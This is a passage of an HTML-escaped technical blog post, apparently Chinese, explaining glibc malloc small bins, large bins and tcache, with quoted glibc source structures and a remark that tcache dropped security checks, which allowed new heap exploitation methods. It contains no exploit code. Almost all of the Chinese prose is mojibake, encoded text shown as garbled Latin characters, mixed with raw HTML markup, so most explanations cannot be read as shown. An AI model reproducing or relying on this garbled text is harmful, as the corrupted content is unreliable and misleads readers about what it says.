é‡‡ç”¨çš„éå†é¡ºåºæ˜¯ FIFOã€‚</p>\n<h2 id=\"å…­-small-bin\"><a class=\"markdownIt-Anchor\" href=\"#å…­-small-bin\">#</a> å…­ã€Small Bin</h2>\n<p>æ¦‚å¿µï¼šå°äº 1024 å­—èŠ‚ï¼ˆ0x400ï¼‰çš„ chunk ç§°ä¹‹ä¸º small chunkï¼Œsmall bin å°±æ˜¯ç”¨äºç®¡ç† small chunk çš„ã€‚<br>\nsmall bin é“¾è¡¨çš„ä¸ªæ•°ä¸º 62 ä¸ªã€‚<br>\nå°±å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾é€Ÿåº¦è€Œè¨€ï¼Œsmall bin æ¯” larger bin å¿«ï¼Œä½†æ¯” fast bin æ…¢ã€‚<br>\nåˆå¹¶æ“ä½œï¼šç›¸é‚»çš„ free chunk éœ€è¦è¿›è¡Œåˆå¹¶æ“ä½œï¼Œå³åˆå¹¶æˆä¸€ä¸ªå¤§çš„ free chunkã€‚å…·ä½“æ“ä½œè§ä¸‹æ–‡ free (small chunk) ä»‹ç»ã€‚</p>\n<blockquote>\n<ul>\n<li>\n<p>Small Bin é“¾è¡¨çš„ç‰¹æ€§</p>\n</li>\n<li>\n<p>æ¯ä¸ª smallbin ä¹Ÿæ˜¯ä¸€ä¸ªç”±å¯¹åº” free chunk ç»„æˆçš„å¾ªç¯åŒé“¾è¡¨ã€‚</p>\n</li>\n<li>\n<p>small bin é‡‡ç”¨ FIFO (å…ˆå…¥å…ˆå‡º) ç®—æ³•ï¼šå†…å­˜é‡Šæ”¾æ“ä½œå°±å°†æ–°é‡Šæ”¾çš„ chunk æ·»åŠ åˆ°é“¾è¡¨çš„ front end (å‰ç«¯)ï¼Œåˆ†é…æ“ä½œå°±ä»é“¾è¡¨çš„ rear end (å°¾ç«¯) ä¸­è·å– chunkã€‚</p>\n</li>\n<li>\n<p>å•ä¸ª smallbin é“¾è¡¨ä¸­çš„ chunk å¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå„ä¸ª smallbin é“¾è¡¨ä¸­çš„ chunk å¤§å°æ˜¯ä¸åŒçš„ï¼Œè·Ÿ fastbinsY æ•°ç»„å­˜å‚¨ fastbin é“¾çš„åŸç†æ˜¯ç›¸åŒçš„ã€‚<br>\nbins æ•°ç»„å­˜å‚¨ small bin é“¾æ—¶ï¼šç¬¬ä¸€ä¸ª small bin é“¾ä¸­ chunk çš„å¤§å°ä¸º 32 å­—èŠ‚ï¼Œåç»­æ¯ä¸ª small bin ä¸­ chunk çš„å¤§å°ä¾æ¬¡å¢åŠ ä¸¤ä¸ªæœºå™¨å­—é•¿ï¼ˆ32 ä½ç›¸å·® 8 å­—èŠ‚ï¼Œ64 ä½ç›¸å·® 16 å­—èŠ‚ï¼‰â€¦ ä»¥æ­¤ç±»æ¨ï¼Œè·Ÿ fastbinsY æ•°ç»„å­˜å‚¨ fastbin é“¾çš„åŸç†æ˜¯ç›¸åŒçš„ï¼ˆç”¨ä¸‹å›¾è¡¨ç¤ºï¼‰ã€‚</p>\n</li>\n<li>\n<p>bin é“¾å­˜å‚¨çš„å¤§å°ä¸æ•°ç»„ä¸‹æ ‡çš„å…³ç³»ï¼šchun_size=2<em>SIZE_SZ</em>indexã€‚</p>\n<p><img data-src=\"/img/bins/2.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>malloc æ“ä½œä¸ small bin çš„åˆå§‹åŒ–</p>\n<ul>\n<li>ç±»ä¼¼äº fast binsï¼Œæœ€åˆæ‰€æœ‰çš„ small bin éƒ½æ˜¯ç©ºçš„ï¼Œå› æ­¤åœ¨å¯¹è¿™äº› small bin å®Œæˆåˆå§‹åŒ–ä¹‹å‰ï¼Œå³ä½¿ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°å±äº small chunk ä¹Ÿä¸ä¼šäº¤ç”± small bin è¿›è¡Œå¤„ç†ï¼Œè€Œæ˜¯äº¤ç”± unsorted bin å¤„ç†ã€‚</li>\n<li>å¦‚æœ unsorted bin ä¹Ÿä¸èƒ½å¤„ç†çš„è¯ï¼Œglibc malloc å°±ä¾æ¬¡éå†åç»­çš„æ‰€æœ‰ binsï¼Œæ‰¾å‡ºç¬¬ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„ binï¼Œå¦‚æœæ‰€æœ‰çš„ bin éƒ½ä¸æ»¡è¶³çš„è¯ï¼Œå°±è½¬è€Œä½¿ç”¨ top chunkï¼Œå¦‚æœ top chunk å¤§å°ä¸å¤Ÿï¼Œé‚£ä¹ˆå°±æ‰©å…… top chunkï¼Œè¿™æ ·å°±ä¸€å®šèƒ½æ»¡è¶³éœ€æ±‚äº†ã€‚</li>\n<li>æ³¨æ„éå†åç»­ bins ä»¥åŠä¹‹åçš„æ“ä½œåŒæ ·è¢« large bin æ‰€ä½¿ç”¨ï¼Œå› æ­¤ï¼Œå°†è¿™éƒ¨åˆ†å†…å®¹æ”¾åˆ° large bin çš„ malloc æ“ä½œä¸­åŠ ä»¥ä»‹ç»ã€‚</li>\n<li>é‚£ä¹ˆ glibc malloc æ˜¯å¦‚ä½•åˆå§‹åŒ–è¿™äº› bins çš„å‘¢ï¼Ÿå› ä¸ºè¿™äº› bin å±äº malloc_state ç»“æ„ä½“ï¼Œæ‰€ä»¥åœ¨åˆå§‹åŒ– malloc_state çš„æ—¶å€™å°±ä¼šå¯¹è¿™äº› bin è¿›è¡Œåˆå§‹åŒ–ï¼Œä»£ç å¦‚ä¸‹ï¼š\n<ul>\n<li>å°† bins æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæˆå‘˜ç´¢å¼•å€¼è®¾ç½®ä¸ºäº† 1ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ 0 (åœ¨ bin_at å®ä¸­ï¼Œè‡ªåŠ¨å°† i è¿›è¡Œäº†å‡ 1 å¤„ç†)ã€‚</li>\n<li>ä»ä¸Šé¢ä»£ç å¯ä»¥çœ‹å‡ºåœ¨åˆå§‹åŒ–çš„æ—¶å€™ glibc malloc å°†æ‰€æœ‰ bin çš„æŒ‡é’ˆéƒ½æŒ‡å‘äº†è‡ªå·± â€”â€” è¿™å°±ä»£è¡¨è¿™äº› bin éƒ½æ˜¯ç©ºçš„ã€‚</li>\n</ul>\n</li>\n</ul>\n<p>â€‹</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">malloc_init_state</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    mbinptr bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">/* Establish circular links for normal bins */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> NBINS<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    bin <span class=\"token operator\">=</span> <span class=\"token function\">bin_at</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ul>\n<li>è¿‡åï¼Œå½“å†æ¬¡è°ƒç”¨ malloc (small chunk) çš„æ—¶å€™ï¼Œå¦‚æœè¯¥ chunk size å¯¹åº”çš„ small bin ä¸ä¸ºç©ºï¼Œå°±ä»è¯¥ small bin é“¾è¡¨ä¸­å–å¾— small chunk ç»™ malloc ä½¿ç”¨ã€‚</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>free æ“ä½œ</p>\n<ul>\n<li>small çš„ free æ¯”è¾ƒç‰¹æ®Šã€‚å½“é‡Šæ”¾ small chunk çš„æ—¶å€™ï¼Œå…ˆæ£€æŸ¥è¯¥ chunk ç›¸é‚»çš„ chunk æ˜¯å¦ä¸º freeï¼Œå¦‚æœæ˜¯çš„è¯å°±è¿›è¡Œåˆå¹¶æ“ä½œï¼šå°†è¿™äº› chunks åˆå¹¶æˆæ–°çš„ chunkï¼Œç„¶åå°†å®ƒä»¬ä» small bin ä¸­ç§»é™¤ï¼Œæœ€åå°†æ–°çš„ chunk æ·»åŠ åˆ° unsorted bin ä¸­ï¼Œä¹‹å unsorted bin è¿›è¡Œæ•´ç†å†æ·»åŠ åˆ°å¯¹åº”çš„ bin é“¾ä¸Šï¼ˆåé¢ä¼šæœ‰å›¾ä»‹ç»ï¼‰ã€‚</li>\n</ul>\n</blockquote>\n<h2 id=\"ä¸ƒ-large-bin\"><a class=\"markdownIt-Anchor\" href=\"#ä¸ƒ-large-bin\">#</a> ä¸ƒã€Large Bin</h2>\n<ul>\n<li>\n<p>æ¦‚å¿µï¼šå¤§äºç­‰äº 1024 å­—èŠ‚ï¼ˆ0x400ï¼‰çš„ chunk ç§°ä¹‹ä¸º large chunkï¼Œlarge bin å°±æ˜¯ç”¨äºç®¡ç†è¿™äº› largechunk çš„ã€‚</p>\n</li>\n<li>\n<p>large bin é“¾è¡¨çš„ä¸ªæ•°ä¸º 63 ä¸ªï¼Œè¢«åˆ†ä¸º 6 ç»„ã€‚</p>\n</li>\n<li>\n<p>largechunk ä½¿ç”¨ fd_nextsizeã€bk_nextsize è¿æ¥èµ·æ¥çš„ã€‚</p>\n</li>\n<li>\n<p>åˆå¹¶æ“ä½œï¼šç±»ä¼¼äº small binã€‚</p>\n</li>\n</ul>\n<blockquote>\n<p>Large Bin é“¾è¡¨çš„ç‰¹æ€§</p>\n<ul>\n<li>åŒä¸€ä¸ª largebin ä¸­æ¯ä¸ª chunk çš„å¤§å°å¯ä»¥ä¸ä¸€æ ·ï¼Œè¿™äº› chunk æ ¹æ®ä¸€å®šçš„èŒƒå›´å­˜å‚¨åœ¨ä¸€ä¸ª larbin é“¾è¡¨ä¸­ã€‚</li>\n<li>large chunk å¯ä»¥æ·»åŠ ã€åˆ é™¤åœ¨ large bin çš„ä»»ä½•ä¸€ä¸ªä½ç½®ã€‚</li>\n<li>åœ¨è¿™ 63 ä¸ª largebins ä¸­ï¼šç¬¬ä¸€ç»„çš„ 32 ä¸ª largebin é“¾ä¾æ¬¡ä»¥ 64 å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼Œå³ç¬¬ä¸€ä¸ª largebin é“¾ä¸­ chunksize ä¸º 1024-1087 å­—èŠ‚ï¼Œç¬¬äºŒä¸ª large bin ä¸­ chunk size ä¸º 1088~1151 å­—èŠ‚ã€‚ç¬¬äºŒç»„çš„ 16 ä¸ª largebin é“¾ä¾æ¬¡ä»¥ 512 å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼›ç¬¬ä¸‰ç»„çš„ 8 ä¸ª largebin é“¾ä»¥æ­¥é•¿ 4096 ä¸ºé—´éš”ï¼›ç¬¬å››ç»„çš„ 4 ä¸ª largebin é“¾ä»¥ 32768 å­—èŠ‚ä¸ºé—´éš”ï¼›ç¬¬äº”ç»„çš„ 2 ä¸ª largebin é“¾ä»¥ 262144 å­—èŠ‚ä¸ºé—´éš”ï¼›æœ€åä¸€ç»„çš„ largebin é“¾ä¸­çš„ chunk å¤§å°æ— é™åˆ¶ã€‚</li>\n</ul>\n<p><img data-src=\"/img/bins/3.jpg\" alt=\"img\"></p>\n<ul>\n<li>åœ¨åŒä¸€ä¸ª largebin ä¸­ï¼šæ¯ä¸ª chunk çš„å¤§å°ä¸ä¸€å®šç›¸åŒï¼Œå› æ­¤ä¸ºäº†åŠ å¿«å†…å­˜åˆ†é…å’Œé‡Šæ”¾çš„é€Ÿåº¦ï¼Œå°±å°†åŒä¸€ä¸ª largebin ä¸­çš„æ‰€æœ‰ chunk æŒ‰ç…§ chunksize è¿›è¡Œä»å¤§åˆ°å°çš„æ’åˆ—ï¼šæœ€å¤§çš„ chunk æ”¾åœ¨ä¸€ä¸ªé“¾è¡¨çš„ front endï¼Œæœ€å°çš„ chunk æ”¾åœ¨ rear endï¼›ç›¸åŒå¤§å°çš„ chunk æŒ‰ç…§æœ€è¿‘ä½¿ç”¨é¡ºåºæ’åºã€‚</li>\n</ul>\n</blockquote>\n<blockquote>\n<h3 id=\"é“¾è¡¨ç´¢å¼•å®å®šä¹‰largebin_index\"><a class=\"markdownIt-Anchor\" href=\"#é“¾è¡¨ç´¢å¼•å®å®šä¹‰largebin_index\">#</a> é“¾è¡¨ç´¢å¼•å®å®šä¹‰ï¼šï¼ˆlargebin_indexï¼‰</h3>\n<ul>\n<li>\n<p>å‚æ•°ä¸ºé“¾è¡¨èƒ½å­˜å‚¨çš„ chunk å¤§å°ï¼Œå®å®šä¹‰ä¸­æœ‰ç®€ä»‹è°ƒç”¨å…¶ä»–å®å®šä¹‰ã€‚</p>\n</li>\n<li>\n<p>ä¾‹å¦‚ï¼šç¬¬ä¸€ä¸ª largebin çš„èµ·å§‹å¤§å°ä¸º 1024ï¼Œé‚£ä¹ˆ 1024&gt;&gt;6=16ï¼Œæ‰€ä»¥å…¶åœ¨ bins æ•°ç»„ä¸­çš„ä¸‹æ ‡ä¸º 48+16=64ã€‚</p>\n<p><img data-src=\"/img/bins/5.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>malloc æ“ä½œä¸ large bin çš„åˆå§‹åŒ–</p>\n<ul>\n<li>åˆå§‹åŒ–å®Œæˆä¹‹å‰çš„æ“ä½œç±»ä¼¼äº small binã€‚</li>\n<li>ä¸‹é¢è®¨è®º large bins åˆå§‹åŒ–å®Œæˆä¹‹åçš„æ“ä½œï¼š\n<ul>\n<li>é¦–å…ˆç¡®å®šç”¨æˆ·è¯·æ±‚çš„å¤§å°å±äºå“ªä¸€ä¸ª large binï¼Œç„¶ååˆ¤æ–­è¯¥ large bin ä¸­æœ€å¤§çš„ chunk çš„ size æ˜¯å¦å¤§äºç”¨æˆ·è¯·æ±‚çš„ size (åªéœ€è¦å¯¹æ¯”é“¾è¡¨ä¸­ front end çš„ size å³å¯)ã€‚å¦‚æœå¤§äºï¼Œå°±ä» rear end å¼€å§‹éå†è¯¥ large binï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ª size ç›¸ç­‰æˆ–æ¥è¿‘çš„ chunkï¼Œåˆ†é…ç»™ç”¨æˆ·ã€‚å¦‚æœè¯¥ chunk å¤§äºç”¨æˆ·è¯·æ±‚çš„ size çš„è¯ï¼Œå°±å°†è¯¥ chunk æ‹†åˆ†ä¸ºä¸¤ä¸ª chunkï¼šå‰è€…è¿”å›ç»™ç”¨æˆ·ï¼Œä¸” size ç­‰åŒäºç”¨æˆ·è¯·æ±‚çš„ sizeï¼›å‰©ä½™çš„éƒ¨åˆ†åšä¸ºä¸€ä¸ªæ–°çš„ chunk æ·»åŠ åˆ° unsorted bin ä¸­ã€‚</li>\n<li>å¦‚æœè¯¥ large bin ä¸­æœ€å¤§çš„ chunk çš„ size å°äºç”¨æˆ·è¯·æ±‚çš„ size çš„è¯ï¼Œé‚£ä¹ˆå°±ä¾æ¬¡æŸ¥çœ‹åç»­çš„ large bin ä¸­æ˜¯å¦æœ‰æ»¡è¶³éœ€æ±‚çš„ chunkï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯é‰´äº bin çš„ä¸ªæ•°è¾ƒå¤š (ä¸åŒ bin ä¸­çš„ chunk ææœ‰å¯èƒ½åœ¨ä¸åŒçš„å†…å­˜é¡µä¸­)ï¼Œå¦‚æœæŒ‰ç…§ä¸Šä¸€æ®µä¸­ä»‹ç»çš„æ–¹æ³•è¿›è¡Œéå†çš„è¯ (å³éå†æ¯ä¸ª bin ä¸­çš„ chunk)ï¼Œå°±å¯èƒ½ä¼šå‘ç”Ÿå¤šæ¬¡å†…å­˜é¡µä¸­æ–­æ“ä½œï¼Œè¿›è€Œä¸¥é‡å½±å“æ£€ç´¢é€Ÿåº¦ï¼Œæ‰€ä»¥ glibc malloc è®¾è®¡äº† Binmap ç»“æ„ä½“æ¥å¸®åŠ©æé«˜ bin-by-bin æ£€ç´¢çš„é€Ÿåº¦ã€‚Binmap è®°å½•äº†å„ä¸ª bin ä¸­æ˜¯å¦ä¸ºç©ºï¼Œé€šè¿‡ bitmap å¯ä»¥é¿å…æ£€ç´¢ä¸€äº›ç©ºçš„ binã€‚å¦‚æœé€šè¿‡ binmap æ‰¾åˆ°äº†ä¸‹ä¸€ä¸ªéç©ºçš„ large bin çš„è¯ï¼Œå°±æŒ‰ç…§ä¸Šä¸€æ®µä¸­çš„æ–¹æ³•åˆ†é… chunkï¼Œå¦åˆ™å°±ä½¿ç”¨ top chunk æ¥åˆ†é…åˆé€‚çš„å†…å­˜ã€‚</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<h3 id=\"freeæ“ä½œ\"><a class=\"markdownIt-Anchor\" href=\"#freeæ“ä½œ\">#</a> free æ“ä½œ</h3>\n<ul>\n<li>\n<p>ç±»ä¼¼äº small chunkã€‚</p>\n<p><img data-src=\"/img/bins/6.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"å…«-tcache\"><a class=\"markdownIt-Anchor\" href=\"#å…«-tcache\">#</a> å…«ã€tcache</h2>\n<p>cache æ˜¯ glibc 2.26 (ubuntu 17.10) ä¹‹åå¼•å…¥çš„ä¸€ç§æŠ€æœ¯ï¼ˆsee <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2V3YXJlLm9yZy9naXQvP3A9Z2xpYmMuZ2l0O2E9Y29tbWl0ZGlmZjtoPWQ1YzNmYWZjNDMwN2M5YjdhNGM3ZDVjYjM4MWZjZGJmYWQzNDBiY2M=\">commit</span>ï¼‰ï¼Œç›®çš„æ˜¯æå‡å †ç®¡ç†çš„æ€§èƒ½ã€‚ä½†æå‡æ€§èƒ½çš„åŒæ—¶èˆå¼ƒäº†å¾ˆå¤šå®‰å…¨æ£€æŸ¥ï¼Œä¹Ÿå› æ­¤æœ‰äº†å¾ˆå¤šæ–°çš„åˆ©ç”¨æ–¹å¼ã€‚</p>\n<blockquote>\n<p>ä¸»è¦å‚è€ƒäº† glibc æºç ï¼Œangelboy çš„ slide ä»¥åŠ tukan.farmï¼Œé“¾æ¥éƒ½æ”¾åœ¨æœ€åäº†ã€‚</p>\n</blockquote>\n<p>ç›¸å…³ç»“æ„ä½“ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18x\">Â¶</span></p>\n<p>tcache å¼•å…¥äº†ä¸¤ä¸ªæ–°çš„ç»“æ„ä½“ï¼Œ <code>tcache_entry</code>  å’Œ  <code>tcache_perthread_struct</code> ã€‚</p>\n<p>è¿™å…¶å®å’Œ fastbin å¾ˆåƒï¼Œä½†åˆä¸ä¸€æ ·ã€‚</p>\n<p>tcache_entry<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9lbnRyeQ==\">Â¶</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2VudHJ5\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* We overlay this structure on the user-data portion of a chunk when</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   the chunk is stored in the per-thread cache.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_entry</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_entry</span> <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> tcache_entry<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>tcache_entry</code>  ç”¨äºé“¾æ¥ç©ºé—²çš„ chunk ç»“æ„ä½“ï¼Œå…¶ä¸­çš„  <code>next</code>  æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå¤§å°ç›¸åŒçš„ chunkã€‚</p>\n<p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„ next æŒ‡å‘ chunk çš„ user dataï¼Œè€Œ fastbin çš„ fd æŒ‡å‘ chunk å¼€å¤´çš„åœ°å€ã€‚</p>\n<p>è€Œä¸”ï¼Œtcache_entry ä¼šå¤ç”¨ç©ºé—² chunk çš„ user data éƒ¨åˆ†ã€‚</p>\n<p>tcache_perthread_struct<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9wZXJ0aHJlYWRfc3RydWN0\">Â¶</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX3BlcnRocmVhZF9zdHJ1Y3Q=\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* There is one of these for each thread, which contains the</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   per-thread cache (hence \"tcache_perthread_struct\").  Keeping</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   overall size low is mildly important.  Note that COUNTS and ENTRIES</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   are redundant (we could have just counted the linked list each</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   time), this is for performance reasons.  */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tcache_perthread_struct</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">char</span> counts<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>entries<span class=\"token punctuation\">[</span>TCACHE_MAX_BINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span> tcache_perthread_struct<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TCACHE_MAX_BINS</span>                <span class=\"token expression\"><span class=\"token number\">64</span></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">static</span> __thread tcache_perthread_struct <span class=\"token operator\">*</span>tcache <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>æ¯ä¸ª thread éƒ½ä¼šç»´æŠ¤ä¸€ä¸ª  <code>tcache_perthread_struct</code> ï¼Œå®ƒæ˜¯æ•´ä¸ª tcache çš„ç®¡ç†ç»“æ„ï¼Œä¸€å…±æœ‰  <code>TCACHE_MAX_BINS</code>  ä¸ªè®¡æ•°å™¨å’Œ  <code>TCACHE_MAX_BINS</code>  é¡¹ tcache_entryï¼Œå…¶ä¸­</p>\n<ul>\n<li><code>tcache_entry</code>  ç”¨å•å‘é“¾è¡¨çš„æ–¹å¼é“¾æ¥äº†ç›¸åŒå¤§å°çš„å¤„äºç©ºé—²çŠ¶æ€ï¼ˆfree åï¼‰çš„ chunkï¼Œè¿™ä¸€ç‚¹ä¸Šå’Œ fastbin å¾ˆåƒã€‚</li>\n<li><code>counts</code>  è®°å½•äº†  <code>tcache_entry</code>  é“¾ä¸Šç©ºé—² chunk çš„æ•°ç›®ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkã€‚</li>\n</ul>\n<p>ç”¨å›¾è¡¨ç¤ºå¤§æ¦‚æ˜¯ï¼š</p>\n<p>åŸºæœ¬å·¥ä½œæ–¹å¼ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18y\">Â¶</span></p>\n<ul>\n<li>ç¬¬ä¸€æ¬¡ malloc æ—¶ï¼Œä¼šå…ˆ malloc ä¸€å—å†…å­˜ç”¨æ¥å­˜æ”¾  <code>tcache_perthread_struct</code>  ã€‚</li>\n<li>free å†…å­˜ï¼Œä¸” size å°äº small bin size æ—¶</li>\n<li>tcache ä¹‹å‰ä¼šæ”¾åˆ° fastbin æˆ–è€… unsorted bin ä¸­</li>\n<li>tcache åï¼š\n<ul>\n<li>å…ˆæ”¾åˆ°å¯¹åº”çš„ tcache ä¸­ï¼Œç›´åˆ° tcache è¢«å¡«æ»¡ï¼ˆé»˜è®¤æ˜¯ 7 ä¸ªï¼‰</li>\n<li>tcache è¢«å¡«æ»¡ä¹‹åï¼Œå†æ¬¡ free çš„å†…å­˜å’Œä¹‹å‰ä¸€æ ·è¢«æ”¾åˆ° fastbin æˆ–è€… unsorted bin ä¸­</li>\n<li>tcache ä¸­çš„ chunk ä¸ä¼šåˆå¹¶ï¼ˆä¸å–æ¶ˆ inuse bitï¼‰</li>\n</ul>\n</li>\n<li>malloc å†…å­˜ï¼Œä¸” size åœ¨ tcache èŒƒå›´å†…</li>\n<li>å…ˆä» tcache å– chunkï¼Œç›´åˆ° tcache ä¸ºç©º</li>\n<li>tcache ä¸ºç©ºåï¼Œä» bin ä¸­æ‰¾</li>\n<li>tcache ä¸ºç©ºæ—¶ï¼Œå¦‚æœ  <code>fastbin/smallbin/unsorted bin</code>  ä¸­æœ‰ size ç¬¦åˆçš„ chunkï¼Œä¼šå…ˆæŠŠ  <code>fastbin/smallbin/unsorted bin</code>  ä¸­çš„ chunk æ”¾åˆ° tcache ä¸­ï¼Œç›´åˆ°å¡«æ»¡ã€‚ä¹‹åå†ä» tcache ä¸­å–ï¼›å› æ­¤ chunk åœ¨ bin ä¸­å’Œ tcache ä¸­çš„é¡ºåºä¼šåè¿‡æ¥</li>\n</ul>\n<p>æºç åˆ†æ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18z\">Â¶</span></p>\n<p>æ¥ä¸‹æ¥ä»æºç çš„è§’åº¦åˆ†æä¸€ä¸‹ tcacheã€‚</p>\n<p>libc_malloc<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fbGliY19tYWxsb2M=\">Â¶</span></p>\n<p>ç¬¬ä¸€æ¬¡ malloc æ—¶ï¼Œä¼šè¿›å…¥åˆ°  <code>MAYBE_INIT_TCACHE ()</code></p>\n<p><span class=\"exturl\" 